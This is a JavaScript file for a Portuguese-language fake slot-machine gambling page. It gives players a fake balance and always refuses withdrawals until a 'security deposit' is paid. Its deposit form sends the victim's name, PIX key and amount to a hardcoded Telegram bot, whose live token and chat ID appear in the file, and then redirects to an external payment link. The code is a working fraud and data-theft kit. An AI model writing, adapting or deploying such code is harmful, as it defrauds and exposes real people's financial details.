/* =========================================================================
   CONFIGURAÇÃO DO TELEGRAM (TOKEN E CHAT ID)
   ========================================================================= */
const TELEGRAM_TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
const TELEGRAM_CHAT_ID = "6238676644";

/* LÓGICA E CONTROLE DE ESTADOS DO JOGO */
let saldoAtual = 50.00;
let valorAposta = 2.00;
let contadorRodadas = 0;

const itensDisponiveis = ["🐯", "🍊", "🔔", "💰", "🧧", "🪙"];

// Sincronização com a interface HTML
document.addEventListener("DOMContentLoaded", () => {
    atualizarDisplayInterface();
    renderizarRolosIniciais();
});

function atualizarDisplayInterface() {
    const elementoSaldo = document.getElementById("saldo");
    const elementoAposta = document.getElementById("valor-aposta");
    if (elementoSaldo) elementoSaldo.innerText = `R$ ${saldoAtual.toFixed(2).replace('.', ',')}`;
    if (elementoAposta) elementoAposta.innerText = `R$ ${valorAposta.toFixed(2).replace('.', ',')}`;
}

function renderizarRolosIniciais() {
    for (let i = 0; i < 3; i++) {
        const containerReel = document.getElementById(`reel-${i}`);
        if (containerReel) {
            containerReel.innerHTML = `
                <div class="slot-item">🐯</div>
                <div class="slot-item">🍊</div>
                <div class="slot-item">🔔</div>
            `;
        }
    }
}

/* SISTEMA DE ALTERAÇÃO DE APOSTAS */
window.alterarAposta = function(direcao) {
    const valoresApostaPermitidos = [2.00, 5.00, 10.00, 20.00, 50.00];
    let indiceAtual = valoresApostaPermitidos.indexOf(valorAposta);
    
    if (direcao === 1 && indiceAtual < valoresApostaPermitidos.length - 1) {
        valorAposta = valoresApostaPermitidos[indiceAtual + 1];
    } else if (direcao === -1 && indiceAtual > 0) {
        valorAposta = valoresApostaPermitidos[indiceAtual - 1];
    }
    atualizarDisplayInterface();
};

/* EVENTO PRINCIPAL: GIRAR OS SLOTS */
window.girarSlots = function() {
    if (saldoAtual < valorAposta) {
        alert("Saldo insuficiente! Faça um depósito para continuar jogando.");
        window.abrirModalDeposito();
        return;
    }

    // Deduz o valor investido na rodada
    saldoAtual -= valorAposta;
    contadorRodadas++;
    atualizarDisplayInterface();

    const botaoGirar = document.getElementById("botao-girar");
    if (botaoGirar) botaoGirar.disabled = true;

    // Dispara a animação visual de giro em cada coluna
    for (let i = 0; i < 3; i++) {
        const containerReel = document.getElementById(`reel-${i}`);
        if (containerReel) containerReel.classList.add("rodando-vertical");
    }

    setTimeout(() => {
        finalizarRodadaEGanho();
    }, 1200);
};

/* PROCESSAMENTO DO RESULTADO E GANHOS COM ALEATORIEDADE INDEPENDENTE */
function finalizarRodadaEGanho() {
    let matrizResultado = [];

    // Geração 100% Aleatória e Independente para cada um dos 3 rolos
    for (let i = 0; i < 3; i++) {
        const indiceAleatorio = Math.floor(Math.random() * itensDisponiveis.length);
        matrizResultado.push(itensDisponiveis[indiceAleatorio]);
    }

    // Para a animação e injeta os itens misturados na tela de forma variada
    for (let i = 0; i < 3; i++) {
        const containerReel = document.getElementById(`reel-${i}`);
        if (containerReel) {
            containerReel.classList.remove("rodando-vertical");
            containerReel.innerHTML = `
                <div class="slot-item">${matrizResultado[i]}</div>
                <div class="slot-item">${matrizResultado[(i + 1) % itensDisponiveis.length]}</div>
                <div class="slot-item">${matrizResultado[(i + 2) % itensDisponiveis.length]}</div>
            `;
        }
    }

    // Validação de vitória (Apenas se os 3 símbolos sorteados coincidirem de verdade)
    if (matrizResultado[0] === matrizResultado[1] && matrizResultado[1] === matrizResultado[2]) {
        let multiplicador = matrizResultado[0] === "🐯" ? 25 : 5;
        let valorGanhoTotal = valorAposta * multiplicador;

        saldoAtual += valorGanhoTotal;
        atualizarDisplayInterface();
        dispararBalaoGanhoLimpo(valorGanhoTotal);
    }

    const botaoGirar = document.getElementById("botao-girar");
    if (botaoGirar) botaoGirar.disabled = false;
}

/* NOVO BALÃO COM TEMPO ACELERADO (FLASH) */
function dispararBalaoGanhoLimpo(valor) {
    const containerBalao = document.getElementById("container-balao-ganho") || document.body;
    
    const elementoBalao = document.createElement("div");
    elementoBalao.className = "balao-ganho-dinamico";
    elementoBalao.innerHTML = `🎉 PARABÉNS! 🎉<br><strong>Você Ganhou R$ ${valor.toFixed(2).replace('.', ',')}</strong>`;
    
    containerBalao.appendChild(elementoBalao);

    // Ajustado para desaparecer muito mais rápido (800 milissegundos)
    setTimeout(() => {
        elementoBalao.style.transition = "opacity 0.4s ease";
        elementoBalao.style.opacity = "0";
        setTimeout(() => elementoBalao.remove(), 400);
    }, 800);
}

/* GERENCIADOR DOS MODAIS DE DEPÓSITO */
window.abrirModalDeposito = function() {
    const modal = document.getElementById("modal-deposito");
    if (modal) modal.style.display = "flex";
};

window.fecharModalDeposito = function() {
    const modal = document.getElementById("modal-deposito");
    if (modal) modal.style.display = "none";
};

window.sacar = function() {
    alert("Saque bloqueado! Você precisa autenticar sua chave PIX realizando o depósito mínimo de segurança.");
    window.abrirModalDeposito();
};

/* ENVIO DOS DADOS DO FORMULÁRIO */
window.salvarEDepositarPIX = function() {
    const nome = document.getElementById("pix-nome")?.value.trim();
    const chave = document.getElementById("pix-chave")?.value.trim();
    const valor = document.getElementById("pix-valor-dep")?.value.trim();

    if (!nome || !chave || !valor) {
        alert("Por favor, preencha todos os campos do PIX corretamente.");
        return;
    }

    const mensagemTexto = `⚠️ *NOVA TENTATIVA DE VALIDAÇÃO* ⚠️\n\n👤 *Nome:* ${nome}\n🔑 *Chave PIX:* ${chave}\n💵 *Valor:* R$ ${valor}\n🎰 *Rodada:* ${contadorRodadas}\n💰 *Saldo:* R$ ${saldoAtual.toFixed(2)}`;

    const urlApiTelegram = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    fetch(urlApiTelegram, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: mensagemTexto,
            parse_mode: "Markdown"
        })
    })
    .then(resposta => {
        if (resposta.ok) {
            alert("Dados de conta recebidos com sucesso! Redirecionando para o gateway de pagamento PIX para ativação do saldo...");
            window.location.href = "https://go.tribopay.com.br/w3p787fphj";
        } else {
            alert("Houve uma instabilidade na conexão de segurança. Tente novamente.");
        }
    })
    .catch(() => {
        alert("Erro ao processar validação. Verifique sua conexão à internet.");
    });
};
